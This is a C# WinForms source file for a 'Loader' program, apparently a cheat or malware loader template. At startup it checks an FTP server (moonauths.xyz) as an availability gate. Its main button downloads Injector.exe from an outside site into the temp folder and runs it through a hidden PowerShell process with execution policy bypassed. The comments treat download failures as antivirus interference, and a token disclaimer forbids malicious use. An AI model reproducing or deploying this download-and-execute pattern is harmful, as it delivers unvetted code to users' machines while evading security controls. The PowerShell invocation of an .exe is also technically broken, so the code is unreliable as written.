using System.Diagnostics;
using System.Drawing.Drawing2D;
using System.Net;

namespace Loader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.Load += new EventHandler(this.Form1_Load);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Region = new Region(CreateRoundedRectanglePath(new Rectangle(0, 0, this.Width, this.Height), 30)); // Ignore
        }

        private GraphicsPath CreateRoundedRectanglePath(Rectangle rect, int cornerRadius)
        {
            GraphicsPath path = new GraphicsPath();
            path.StartFigure();
            path.AddArc(rect.X, rect.Y, cornerRadius, cornerRadius, 180, 90);
            path.AddArc(rect.Right - cornerRadius, rect.Y, cornerRadius, cornerRadius, 270, 90);
            path.AddArc(rect.Right - cornerRadius, rect.Bottom - cornerRadius, cornerRadius, cornerRadius, 0, 90); // Ignore
            path.AddArc(rect.X, rect.Bottom - cornerRadius, cornerRadius, cornerRadius, 90, 90);
            path.CloseFigure();
            return path;
        }

        protected override void OnResize(EventArgs e)
        {
            base.OnResize(e);
            this.Region = new Region(CreateRoundedRectanglePath(new Rectangle(0, 0, this.Width, this.Height), 30));
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            this.Close(); // Close Program
        }

        private bool IsFtpServerOnline(string ftpUrl, string username, string password)
        {
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftpUrl);
                request.Credentials = new NetworkCredential(username, password);
                request.Method = WebRequestMethods.Ftp.ListDirectory;
                using (FtpWebResponse response = (FtpWebResponse)request.GetResponse()) // FTP Shit don't edit unless you know what you,
                {                                                                       // know what you are doing / advanced coder only.
                    return true;
                }
            }
            catch (Exception)
            {
                return false;
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (IsFtpServerOnline("ftp://moonauths.xyz", "username", "password")) // Check FTP Server Auth
            {
                this.StartPosition = FormStartPosition.CenterScreen;
            }
            else
            {
                MessageBox.Show("Servers Offline.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); // Website FTP Offline (SS Protection) (YOU NEED YOUR OWN SITE BTW)
                this.Close();
            }
        }

        private void label5_Click(object sender, EventArgs e)
        {

        }

        private void guna2GradientButton1_Click(object sender, EventArgs e)
        {
            string fileUrl = "https://moonauth.xyz/C:/Downloads/Injector.exe"; // Example Injector Download from Website, Do not use for Malicious Useage.
            string localFilePath = Path.Combine(Path.GetTempPath(), "Injector.exe"); // Create Temp Path in User Directory
            using (WebClient webClient = new WebClient())
            {
                try
                {
                    webClient.DownloadFile(fileUrl, localFilePath);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error Injecting (Antivirus): " + ex.Message); // Antivirus was Enabled
                    return;
                }
            }
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell";
            psi.Arguments = $"-NoProfile -ExecutionPolicy Bypass -File \"{localFilePath}\""; // Start File
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.CreateNoWindow = true;

            try
            {
                using (Process process = Process.Start(psi)) // Start File
                {
                    process.WaitForExit();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    if (process.ExitCode == 0)
                    {
                        MessageBox.Show("File executed successfully:\n" + output); // All Good Message
                    }
                    else
                    {
                        MessageBox.Show("Error executing file:\n" + error); // Error Message
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error running file: " + ex.Message); // Error Message
            }
        }
    }
}
